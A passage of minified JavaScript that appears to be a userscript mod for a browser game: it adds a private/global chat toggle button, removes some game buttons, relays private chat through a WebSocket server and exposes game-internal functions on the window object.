    (button.style.top = "290px"),
    (button.style.left = "0px"),
    (button.style.opacity = "0"),
    (button.style.visibility = "hidden"),
    (button.style.transition = "opacity 0.65s ease, background-color 0.25s ease"),
    (button.textContent = "Switch To Private Chat");
var isEnabled = !0;

function updateButton() {
    isEnabled
        ? ((button.textContent = "Switch To Private Chat"),
           (button.style.backgroundColor = "#007bff"))
    : ((button.textContent = "Switch To Global Chat"),
       (button.style.backgroundColor = "#dc3545"));
}
updateButton(),
    button.addEventListener("click", function () {
    (isEnabled = !isEnabled), updateButton(), this.blur();
}),
    document.body.appendChild(button),
    document.getElementById("chatButton").remove(),
    document.getElementById("partyButton").remove(),
    document.getElementById("joinPartyButton").remove(),
    (window.resetMenuChText = resetMenuChText),
    resetMenuChText(),
    addMenuChText("script loaded, made by Onion", "white", "KTA", "turquoise");
var socket = new WebSocket("wss://kta-communication-network-hub.glitch.me");
socket.addEventListener("open", function (t) {
    addMenuChText("connected to central server", "white", "KTA", "turquoise");
}),
    socket.addEventListener("message", function (t) {
    let n = JSON.parse(t.data);
    addMenuChText(
        n[2],
        "#fff",
        "[PRIVATE] " + n[1] + "[" + n[0] + "]:",
        "#e66532"
    );
    let i = _i(n[0]);
    i &&
        ((i.privateChatMessage = n[2]),
         (i.privateChatCountdown = T.chatCountdown));
}),
    socket.addEventListener("error", function (t) {
    addMenuChText("central server unavailable", "red", "KTA", "turquoise");
}),
    socket.addEventListener("close", function (t) {
    addMenuChText(
        "central server closed connection",
        "red",
        "KTA",
        "turquoise"
    );
}),
    (window.openLink = Lo),
    (window.aJoinReq = Gn),
    (window.follmoo = Bh),
    (window.kickFromClan = ko),
    (window.sendJoin = vo),
    (window.leaveAlliance = xo),
    (window.createAlliance = Yn),
    (window.storeBuy = bo),
    (window.storeEquip = Jn),
    (window.showItemInfo = Se),
    (window.selectSkinColor = mf),
    (window.changeStoreIndex = cf),
    (window.config = T);